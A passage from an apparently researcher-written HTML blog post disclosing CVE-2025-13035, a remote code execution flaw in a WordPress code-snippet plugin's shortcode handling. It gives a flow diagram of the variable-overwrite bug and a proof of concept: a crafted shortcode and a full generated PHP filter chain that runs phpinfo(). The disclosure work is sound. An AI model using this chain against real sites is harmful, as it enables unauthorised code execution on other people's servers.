class=&#34;mermaid&#34;&gt;&#xD;&#xA;graph&amp;ensp;TD&#xD;&#xA;&#xD;&#xA;A[&#34;Contributor&amp;ensp;inserts&amp;ensp;[code_snippet]&amp;ensp;shortcode&#34;]&amp;ensp;--&gt;&amp;ensp;B[&#34;WordPress&amp;ensp;calls&amp;ensp;render_content_shortcode()&#34;]&#xD;&#xA;B&amp;ensp;--&gt;&amp;ensp;C[&#34;convert_boolean_attribute_flags()&#34;]&#xD;&#xA;C&amp;ensp;--&gt;&amp;ensp;D[&#34;shortcode_atts():&amp;ensp;merge&amp;ensp;defaults&amp;ensp;into&amp;ensp;$atts&#34;]&#xD;&#xA;D&amp;ensp;--&gt;&amp;ensp;E[&#34;Determine&amp;ensp;snippet_id&amp;ensp;â†’&amp;ensp;if&amp;ensp;invalid&amp;ensp;â†’&amp;ensp;invalid_id_warning()&#34;]&#xD;&#xA;&#xD;&#xA;E&amp;ensp;--&gt;&amp;ensp;F[&#34;get_snippet(id,&amp;ensp;network,&amp;ensp;&#39;html&#39;)&amp;ensp;â†’&amp;ensp;create&amp;ensp;Snippet&amp;ensp;object&#34;]&#xD;&#xA;F&amp;ensp;--&gt;&amp;ensp;G{&#34;snippet.scope&amp;ensp;==&amp;ensp;&#39;content&#39;?&#34;}&#xD;&#xA;&#xD;&#xA;G&amp;ensp;--&amp;ensp;No&amp;ensp;--&gt;&amp;ensp;H[&#34;render_snippet_source()&#34;]&#xD;&#xA;H&amp;ensp;--&gt;&amp;ensp;Z[&#34;End&#34;]&#xD;&#xA;&#xD;&#xA;G&amp;ensp;--&amp;ensp;Yes&amp;ensp;--&gt;&amp;ensp;I[&#34;evaluate_shortcode_content(snippet,&amp;ensp;original_atts)&#34;]&#xD;&#xA;&#xD;&#xA;I&amp;ensp;--&gt;&amp;ensp;J{&#34;original_atts[&#39;php&#39;]&amp;ensp;enabled?&#34;}&#xD;&#xA;J&amp;ensp;--&amp;ensp;No&amp;ensp;--&gt;&amp;ensp;K[&#34;Return&amp;ensp;snippet-&gt;code&#34;]&amp;ensp;--&gt;&amp;ensp;Z&#xD;&#xA;&#xD;&#xA;J&amp;ensp;--&amp;ensp;Yes&amp;ensp;--&gt;&amp;ensp;L{&#34;Snippet_Files::is_active()?&#34;}&#xD;&#xA;&#xD;&#xA;L&amp;ensp;--&amp;ensp;No&amp;ensp;--&gt;&amp;ensp;M[&#34;evaluate_shortcode_from_db()&#34;]&amp;ensp;--&gt;&amp;ensp;Z&#xD;&#xA;&#xD;&#xA;L&amp;ensp;--&amp;ensp;Yes&amp;ensp;--&gt;&amp;ensp;N[&#34;Build&amp;ensp;file&amp;ensp;path:&amp;ensp;build_snippet_flat_file_path()&#34;]&#xD;&#xA;N&amp;ensp;--&gt;&amp;ensp;O{&#34;Does&amp;ensp;file&amp;ensp;exist?&#34;}&#xD;&#xA;&#xD;&#xA;O&amp;ensp;--&amp;ensp;No&amp;ensp;--&gt;&amp;ensp;M&#xD;&#xA;&#xD;&#xA;O&amp;ensp;--&amp;ensp;Yes&amp;ensp;--&gt;&amp;ensp;P[&#34;evaluate_shortcode_from_flat_file(filepath,&amp;ensp;atts)&#34;]&#xD;&#xA;&#xD;&#xA;P&amp;ensp;--&gt;&amp;ensp;Q[&#34;extract(atts)&amp;ensp;inside&amp;ensp;IIFE&#34;]&#xD;&#xA;Q&amp;ensp;--&gt;&amp;ensp;R{&#34;Do&amp;ensp;atts&amp;ensp;contain&amp;ensp;variable-name&amp;ensp;collisions&amp;ensp;(e.g.,&amp;ensp;&#39;filepath&#39;)?&#34;}&#xD;&#xA;&#xD;&#xA;R&amp;ensp;--&amp;ensp;No&amp;ensp;--&gt;&amp;ensp;S[&#34;require_once&amp;ensp;filepath&amp;ensp;(safe)&#34;]&amp;ensp;--&gt;&amp;ensp;Z&#xD;&#xA;&#xD;&#xA;R&amp;ensp;--&amp;ensp;Yes&amp;ensp;--&gt;&amp;ensp;T[&#34;Internal&amp;ensp;variable&amp;ensp;overwritten&amp;ensp;â†’&amp;ensp;filepath&amp;ensp;replaced&#34;]&#xD;&#xA;T&amp;ensp;--&gt;&amp;ensp;U[&#34;require_once&amp;ensp;attacker-controlled&amp;ensp;file&#34;]&#xD;&#xA;U&amp;ensp;--&gt;&amp;ensp;V[&#34;RCE&amp;ensp;achieved&#34;]&#xD;&#xA;V&amp;ensp;--&gt;&amp;ensp;Z&#xD;&#xA;&lt;/pre&gt;&lt;/div&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Administrator enables the &amp;ldquo;Enable file-based execution&amp;rdquo; option.&lt;/li&gt;&#xA;&lt;li&gt;Contributor inserts the following shortcode into a post with &lt;code&gt;snippet_id&lt;/code&gt; pointing to a Snippet of type HTML (&lt;code&gt;content&lt;/code&gt;):&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[code_snippet&amp;ensp;snippet_id=4&amp;ensp;php=1&amp;ensp;filepath=/path/to/file]&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here the attacker has full control over the &lt;code&gt;filepath&lt;/code&gt; variable. This allows using PHP stream wrappers (e.g., filter chains) to achieve code execution because:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;require_once&lt;/code&gt; only checks whether the input is a valid PHP path; it attempts to load &lt;strong&gt;any&lt;/strong&gt; provided stream, not limited to physical files.&lt;/li&gt;&#xA;&lt;li&gt;PHP filter chains can transform the stream content so PHP interprets the final output as valid PHP code. Once the filtered content is passed to &lt;code&gt;require_once&lt;/code&gt;, PHP executes it.&lt;/li&gt;&#xA;&lt;li&gt;Many wrappers such as &lt;code&gt;http://&lt;/code&gt; or &lt;code&gt;ftp://&lt;/code&gt; are restricted by default &lt;code&gt;allow_url_include&lt;/code&gt; settings, but internal wrappers like &lt;code&gt;php://filter&lt;/code&gt; are unaffected by this limitation.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xD;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Info&lt;/div&gt;&#xD;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;A &lt;strong&gt;filter chain&lt;/strong&gt; in PHP allows chaining multiple stream filters to process data when reading or writing from a file/stream. It works using the special wrapper: &lt;code&gt;php://filter&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;This technique is used in CTF competitions, based on the following principles:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;php://filter&lt;/code&gt;: allows attaching filters to a stream (here &lt;code&gt;php://temp&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Filter chain: filters are concatenated with &lt;code&gt;|&lt;/code&gt;. Data passes through each filter from left to right.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Main filters in the chain:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;convert.iconv.&amp;lt;from&amp;gt;&lt;/code&gt;.&lt;code&gt;&amp;lt;to&amp;gt;&lt;/code&gt;: converts encoding from one charset to another.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;convert.base64-encode&lt;/code&gt; / &lt;code&gt;convert.base64-decode&lt;/code&gt;: encode or decode base64.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;By combining dozens of filters, data is transformed multiple times: encode â†’ re-encode â†’ decode â†’ encode â†’ â€¦ until the end.&#xA;Reference: &lt;a href=&#34;https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;&#xD;&#xA;  &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&lt;p&gt;Run the &lt;a href=&#34;https://github.com/synacktiv/php_filter_chain_generator/tree/main&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;script&lt;/a&gt; to generate a PHP Filter Chain:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$&amp;ensp;python3&amp;ensp;php_filter_chain_generator.py&amp;ensp;--chain&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;?php&amp;ensp;phpinfo();&amp;ensp;?&amp;gt;&amp;ensp;&amp;ensp;&amp;#39;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&amp;ensp;The&amp;ensp;following&amp;ensp;gadget&amp;ensp;chain&amp;ensp;will&amp;ensp;generate&amp;ensp;the&amp;ensp;following&amp;ensp;code&amp;ensp;:&amp;ensp;&amp;lt;?php&amp;ensp;phpinfo&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&amp;ensp;?&amp;gt;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;base64&amp;ensp;value:&amp;ensp;PD9waHAgcGhwaW5mbygpOyA/PiAg&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;php://filter/convert.iconv.UTF8.CSISO2022KR&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-encode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.UTF8.UTF7&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.SE2.UTF-16&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.CSIBM921.NAPLPS&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.855.CP936&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.IBM-932.UTF-8&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-decode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-encode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.UTF8.UTF7&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.8859_3.UTF16&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.863.SHIFT_JISX0213&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-decode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-encode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.UTF8.UTF7&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.DEC.UTF-16&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.ISO8859-9.ISO_6937-2&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.UTF16.GB13000&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-decode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-encode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.UTF8.UTF7&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.SE2.UTF-16&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.CSIBM1161.IBM-932&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.MS932.MS936&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.BIG5.JOHAB&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-decode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-encode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.UTF8.UTF7&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.IBM869.UTF16&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.L3.CSISO90&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.UCS2.UTF-8&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.CSISOLATIN6.UCS-4&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-decode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-encode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.UTF8.UTF7&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.8859_3.UTF16&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.863.SHIFT_JISX0213&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-decode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-encode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.UTF8.UTF7&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.851.UTF-16&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.L1.T.618BIT&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-decode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-encode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.UTF8.UTF7&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.CSA_T500.UTF-32&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.CP857.ISO-2022-JP-3&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.ISO2022JP2.CP775&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-decode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-encode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.UTF8.UTF7&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.IBM891.CSUNICODE&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.ISO8859-14.ISO6937&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.BIG-FIVE.UCS-4&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-decode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-encode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.UTF8.UTF7&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.SE2.UTF-16&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.CSIBM921.NAPLPS&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.855.CP936&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.IBM-932.UTF-8&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-decode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-encode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.UTF8.UTF7&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.851.UTF-16&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.L1.T.618BIT&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-decode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-encode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.UTF8.UTF7&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.JS.UNICODE&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.L4.UCS2&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.UCS-2.OSF00030010&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.CSIBM1008.UTF32BE&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-decode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-encode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.UTF8.UTF7&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.SE2.UTF-16&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.CSIBM921.NAPLPS&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.CP1163.CSA_T500&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.UCS-2.MSCP949&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-decode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-encode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.UTF8.UTF7&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.UTF8.UTF16LE&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.UTF8.CSISO2022KR&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.UTF16.EUCTW&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.8859_3.UCS2&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-decode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-encode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.UTF8.UTF7&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.SE2.UTF-16&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.CSIBM1161.IBM-932&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.MS932.MS936&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-decode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-encode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.UTF8.UTF7&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.CP1046.UTF32&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.L6.UCS-2&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.UTF-16LE.T.61-8BIT&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.865.UCS-4LE&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-decode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-encode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.UTF8.UTF7&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.MAC.UTF16&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.L8.UTF16BE&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-decode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-encode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.UTF8.UTF7&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.CSGB2312.UTF-32&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.IBM-1161.IBM932&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.GB13000.UTF16BE&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.864.UTF-32LE&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-decode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-encode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.UTF8.UTF7&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.L6.UNICODE&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.CP1282.ISO-IR-90&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-decode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-encode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.UTF8.UTF7&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.L4.UTF32&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.CP1250.UCS-2&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-decode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-encode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.UTF8.UTF7&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.SE2.UTF-16&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.CSIBM921.NAPLPS&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.855.CP936&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.IBM-932.UTF-8&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-decode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-encode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.UTF8.UTF7&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.8859_3.UTF16&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.863.SHIFT_JISX0213&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-decode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-encode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.UTF8.UTF7&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.CP1046.UTF16&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.ISO6937.SHIFT_JISX0213&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-decode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-encode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.UTF8.UTF7&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.CP1046.UTF32&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.L6.UCS-2&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.UTF-16LE.T.61-8BIT&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.865.UCS-4LE&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-decode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-encode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.UTF8.UTF7&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.MAC.UTF16&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.L8.UTF16BE&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-decode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-encode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.UTF8.UTF7&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.CSIBM1161.UNICODE&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.ISO-IR-156.JOHAB&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-decode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-encode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.UTF8.UTF7&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.INIS.UTF16&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.CSIBM1133.IBM943&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.IBM932.SHIFT_JISX0213&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-decode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-encode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.UTF8.UTF7&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.SE2.UTF-16&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.CSIBM1161.IBM-932&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.MS932.MS936&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.BIG5.JOHAB&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-decode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-encode&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.iconv.UTF8.UTF7&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;convert.base64-decode/resource&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;php://temp&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Assign the generated value to &lt;code&gt;filepath&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-27-cve-2025-13035/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-11-27-cve-2025-13035/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-27-cve-2025-13035/result.png&#39; alt=&#34;Result&#34; height=&#34;862&#34; width=&#34;1494&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  